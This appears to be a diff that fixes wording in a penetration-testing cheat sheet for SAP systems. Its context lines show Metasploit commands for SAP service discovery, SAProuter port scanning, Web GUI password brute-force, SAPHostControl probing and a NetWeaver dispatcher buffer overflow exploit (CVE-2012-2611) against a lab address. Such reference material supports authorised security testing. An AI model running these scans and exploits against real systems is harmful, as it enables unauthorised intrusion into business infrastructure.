@@ -820,7 +820,7 @@ Sources:
 	|_      https://help.sap.com/saphelp_nw73ehp1/helpdata/en/4a/5c004250995a6ae10000000a42189b/frameset.htm
 ```
 
-<i/> SAP Discovery using NMAP custom probes for better detecting SAP services (https://github.com/gelim/nmap-erpscan) </i>
+<i/> SAP discovery using NMAP custom probes for a better detection of SAP services (https://github.com/gelim/nmap-erpscan) </i>
 ```
 => https://github.com/gelim/nmap-erpscan/blob/master/sap_ports.py
 
@@ -845,9 +845,9 @@ Sources:
 	Service Info: Host: java745
  ```
 
-<i/> SAP Discovery using Metasploit (Module 'sap_service_discovery' - https://www.metasploit.com) </i>
+<i/> SAP discovery using the Metasploit module 'sap_service_discovery' (https://www.metasploit.com) </i>
 ```
-Module to perform network scans against SAP platforms, which can be found under modules/ auxiliary/scanner/sap/sap_service_discovery.rb: 
+Module to perform network scans against SAP platforms, which can be found under 'modules/auxiliary/scanner/sap/sap_service_discovery.rb': 
 msf  > use auxiliary/scanner/sap/sap_service_discovery.
 msf  > set RHOST 192.168.1.149
 msf  > exploit
@@ -855,8 +855,8 @@ msf  > exploit
 
 <i/> SAP Router </i>
 ```
-Module to launch a port scanner through an SAProuter. 
-The module is available on modules/auxiliary/scanner/sap/sap_router_portscanner.rb and allows two types of working modes: 
+Module to launch a port scanner through a SAProuter. 
+The module is available on 'modules/auxiliary/scanner/sap/sap_router_portscanner.rb' and allows two types of working modes: 
 * SAP_PROTO: Allows port scanning when S(ecure) entries are set in the SAProuter ACL configuration. 
 * TCP: Allows port scanning when P(ermit) entries are set in the SAProuter ACL configuration.
 
@@ -955,7 +955,7 @@ tries to access it.
 
 <i/> SAP Web interface password brute-force using Metasploit </i>
 ```
-Launch brute force attacks against the Web GUI with the module : auxiliary/scanner/sap/sap_web_gui_brute_login.rb
+Launch password brute-force attacks against the Web GUI with the Metasploit module "auxiliary/scanner/sap/sap_web_gui_brute_login.rb"
 
 msf > use auxiliary/scanner/sap/sap_web_gui_brute_login
 msf auxiliary(sap_web_gui_brute_login) > show options
@@ -1031,7 +1031,7 @@ modules/exploits/windows/http/sap_mgmt_con_osexec_ payload.rb
 
 <i/> Exploiting SAPHostControl with Metasploit </i>
 ```
-The component that provides the SOAP endpoint for the SAP Management Console on the TCP/50013 for the default instance is startsrv. 
+The component that provides the SOAP endpoint for the SAP Management Console on the TCP port '50013' for the default instance is "startsrv". 
 
 According to the SAP documentation, the executable sapstartsrv runs in host mode for monitoring purposes only.
 The interesting thing about this sapstartsrv component is that it’s also listening for SOAP requests. 
@@ -1059,7 +1059,7 @@ msf auxiliary(sap_hostctrl_getcomputersystem) > run
 
 <i/> SAP NetWeaver Dispatcher </i>
 ```
-The disp+work.exe process is vulnerable to a buffer over ow (CVE-2012-2611) while handling Traces, which can be exploited with metasploit Module modules/exploits/windows/misc/sap_netweaver_dispatcher.rb: 
+The disp+work.exe process is vulnerable to a buffer overflow (CVE-2012-2611) while handling Traces, which can be exploited with the metasploit module modules/exploits/windows/misc/sap_netweaver_dispatcher.rb: 
 msf  exploit(sap_netweaver_dispatcher) > use exploit/windows/misc/sap_netweaver_dispatcher
 msf  exploit(sap_netweaver_dispatcher) > set RHOST 192.168.1.149
 RHOST => 192.168.1.149
